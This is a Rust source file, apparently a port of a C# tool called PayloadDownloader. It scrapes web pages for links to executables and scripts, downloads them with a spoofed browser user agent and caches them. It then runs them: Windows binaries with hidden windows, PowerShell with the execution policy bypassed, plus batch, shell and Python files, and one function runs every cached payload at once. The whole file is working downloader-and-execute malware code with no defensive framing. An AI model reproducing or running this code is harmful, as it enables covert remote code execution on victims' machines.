// dumper.rs — Rust port of dumper.cs (PayloadDownloader)
// Scrapes URLs for payload links, downloads, caches, and executes payloads.

use std::collections::HashSet;
use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;
#[cfg(target_os = "windows")]
use std::os::windows::process::CommandExt;
use regex::Regex;
use log::{info, warn};

/// Cache directory for downloaded payloads
fn cache_dir() -> PathBuf {
    let dir = std::env::temp_dir().join("pd_cache");
    let _ = fs::create_dir_all(&dir);
    dir
}

pub struct PayloadDownloader;

impl PayloadDownloader {
    /// Scrapes a URL for downloadable file links (exe, dll, ps1, bat, etc.)
    pub async fn scrape_urls(page_url: &str) -> Vec<String> {
        let client = reqwest::Client::builder()
            .timeout(std::time::Duration::from_secs(30))
            .build()
            .unwrap();

        let mut found_urls = Vec::new();

        match client.get(page_url).send().await {
            Ok(resp) => {
                if let Ok(body) = resp.text().await {
                    let url_re = Regex::new(
                        r#"https?://[^\s"'<>]+\.(exe|dll|ps1|bat|vbs|msi|py|sh|bin|scr)"#
                    ).unwrap();

                    let seen: HashSet<String> = HashSet::new();
                    for cap in url_re.captures_iter(&body) {
                        let url = cap.get(0).unwrap().as_str().to_string();
                        if !seen.contains(&url) {
                            found_urls.push(url);
                        }
                    }
                }
            }
            Err(e) => warn!("Scrape error for {}: {}", page_url, e),
        }

        info!("[+] Scraped {} payload URL(s) from {}", found_urls.len(), page_url);
        found_urls
    }

    /// Downloads a file from a URL and caches it locally.
    /// Returns the local file path on success.
    pub async fn download_file(url: &str) -> Option<String> {
        let client = reqwest::Client::builder()
            .timeout(std::time::Duration::from_secs(60))
            .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            .build()
            .ok()?;

        let file_name = url
            .rsplit('/')
            .next()
            .unwrap_or("payload.bin")
            .to_string();

        let file_path = cache_dir().join(&file_name);

        // Skip if already cached
        if file_path.exists() {
            info!("[*] Already cached: {}", file_name);
            return Some(file_path.to_string_lossy().to_string());
        }

        info!("[*] Downloading: {}", url);

        match client.get(url).send().await {
            Ok(resp) => {
                if resp.status().is_success() {
                    match resp.bytes().await {
                        Ok(data) => {
                            match fs::write(&file_path, &data) {
                                Ok(_) => {
                                    info!("[+] Downloaded: {} ({} bytes)", file_name, data.len());
                                    Some(file_path.to_string_lossy().to_string())
                                }
                                Err(e) => {
                                    warn!("[-] Write failed for {}: {}", file_name, e);
                                    None
                                }
                            }
                        }
                        Err(e) => {
                            warn!("[-] Read error for {}: {}", url, e);
                            None
                        }
                    }
                } else {
                    warn!("[-] HTTP {} for {}", resp.status(), url);
                    None
                }
            }
            Err(e) => {
                warn!("[-] Download error for {}: {}", url, e);
                None
            }
        }
    }

    /// Executes a downloaded payload by file path.
    pub fn execute_file(file_path: &str) -> String {
        let path = Path::new(file_path);
        if !path.exists() {
            return format!("File not found: {}", file_path);
        }

        let ext = path.extension()
            .and_then(|e| e.to_str())
            .unwrap_or("")
            .to_lowercase();

        let result = match ext.as_str() {
            "exe" | "bin" | "scr" => {
                #[cfg(target_os = "windows")]
                {
                    Command::new(file_path)
                        .creation_flags(0x08000000) // CREATE_NO_WINDOW
                        .spawn()
                        .map(|_| format!("Started: {}", file_path))
                        .unwrap_or_else(|e| format!("Exec failed: {}", e))
                }
                #[cfg(not(target_os = "windows"))]
                {
                    // Make executable first
                    let _ = Command::new("chmod").args(&["+x", file_path]).output();
                    Command::new(file_path)
                        .spawn()
                        .map(|_| format!("Started: {}", file_path))
                        .unwrap_or_else(|e| format!("Exec failed: {}", e))
                }
            }
            "ps1" => {
                Command::new("powershell.exe")
                    .args(&["-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-File", file_path])
                    .output()
                    .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
                    .unwrap_or_else(|e| format!("PS1 error: {}", e))
            }
            "bat" | "cmd" => {
                Command::new("cmd.exe")
                    .args(&["/c", file_path])
                    .output()
                    .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
                    .unwrap_or_else(|e| format!("BAT error: {}", e))
            }
            "sh" => {
                Command::new("bash")
                    .arg(file_path)
                    .output()
                    .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
                    .unwrap_or_else(|e| format!("SH error: {}", e))
            }
            "py" => {
                Command::new("python3")
                    .arg(file_path)
                    .output()
                    .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
                    .unwrap_or_else(|e| format!("PY error: {}", e))
            }
            _ => format!("Unsupported file type: .{}", ext),
        };

        info!("[*] Execute result for {}: {}", file_path, &result[..std::cmp::min(100, result.len())]);
        result
    }

    /// Executes all cached payloads.
    pub fn execute_all() -> Vec<String> {
        let cache = cache_dir();
        let mut results = Vec::new();

        if let Ok(entries) = fs::read_dir(&cache) {
            for entry in entries.flatten() {
                let path = entry.path();
                if path.is_file() {
                    let result = Self::execute_file(&path.to_string_lossy());
                    results.push(result);
                }
            }
        }

        results
    }

    /// Lists all cached payloads.
    pub fn list_cached() -> Vec<String> {
        let cache = cache_dir();
        let mut files = Vec::new();

        if let Ok(entries) = fs::read_dir(&cache) {
            for entry in entries.flatten() {
                let path = entry.path();
                if path.is_file() {
                    let size = fs::metadata(&path)
                        .map(|m| m.len())
                        .unwrap_or(0);
                    files.push(format!(
                        "{} ({} bytes)",
                        path.file_name().unwrap_or_default().to_string_lossy(),
                        size
                    ));
                }
            }
        }

        files
    }

    /// Clears the payload cache directory.
    pub fn clear_cache() -> String {
        let cache = cache_dir();
        match fs::remove_dir_all(&cache) {
            Ok(_) => {
                let _ = fs::create_dir_all(&cache);
                "Cache cleared.".to_string()
            }
            Err(e) => format!("Clear failed: {}", e),
        }
    }
}
